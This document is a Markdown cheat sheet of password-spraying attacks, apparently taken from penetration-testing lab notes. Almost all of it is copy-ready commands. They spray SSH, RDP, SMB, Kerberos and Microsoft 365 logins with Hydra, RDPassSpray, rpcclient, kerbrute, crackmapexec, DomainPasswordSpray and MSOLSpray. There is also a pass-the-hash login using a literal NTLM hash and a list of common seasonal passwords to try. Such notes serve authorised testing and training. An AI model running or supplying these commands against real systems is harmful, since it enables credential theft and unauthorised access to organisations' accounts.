# Password Spraying

## Hydra
```
hydra -L usernames.txt -p Sprint2022 ssh://10.10.10.10
```

## RDPassSpray for RDP
[RDPassSpray Github](https://github.com/xFreed0m/RDPassSpray)

```
python3 RDPassSpray.py -u victim -p Spring2021! -t 10.100.10.240:3026
```

## RPCClient
```
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

## Kerbrute
Had issues with /etc/krb5.conf with Linux test, might need to modify conf file
Make sure your valid_users list is the proper format (fname,last_name, etc) not full email address

[Linux Kerberos Auth Against Windows](https://michlstechblog.info/blog/linux-kerberos-authentification-against-windows-active-directory/#more-1628)

```
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
.\kerbrute_Windows.exe passwordspray -d inlanefreight.local --dc 172.16.5.5 .\valid_users.txt Welcome1  -o .\spray_success_kerbrute --safe
```

## Crackmapexec
Make sure your valid_users list is the proper format (fname,last_name, etc)

```
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 |grep +
sudo crackmapexec smb 172.16.5.0/23 -u administrator -H '88ad09182de639ccc6579eb0849751cf' --local-auth
```

## DomainPasswordSpray
```
## If you have access to the machine
C:\> . .\DomainPasswordSpray.ps1 or Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

## Using lists
Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
Invoke-DomainPasswordSpray -UserList .\valid_users.txt -Domain inlanefreight.local -Password Welcome1 -OutFile spray_success_02 -ErrorAction SilentlyContinue
```

## MSOLSpray
```
Invoke-MSOLSpray -UserList .\userlist.txt -Password <password to spray>
```

## Potential Starting Password Sprays
```
password
Password1
Passw0rd
Welcome1
AutumnYY
SpringYY
SummerYY
WinterYY
```

## SprayingToolkit
[SprayingToolkit Github](https://github.com/byt3bl33d3r/SprayingToolkit)

## MailSniper
[MailSniper Github](https://github.com/dafthack/MailSniper)

## DomainPasswordSpray
[Domain Password Spray](https://github.com/dafthack/DomainPasswordSpray)

## MSOLSpray
[MSOLSpray](https://github.com/dafthack/MSOLSpray)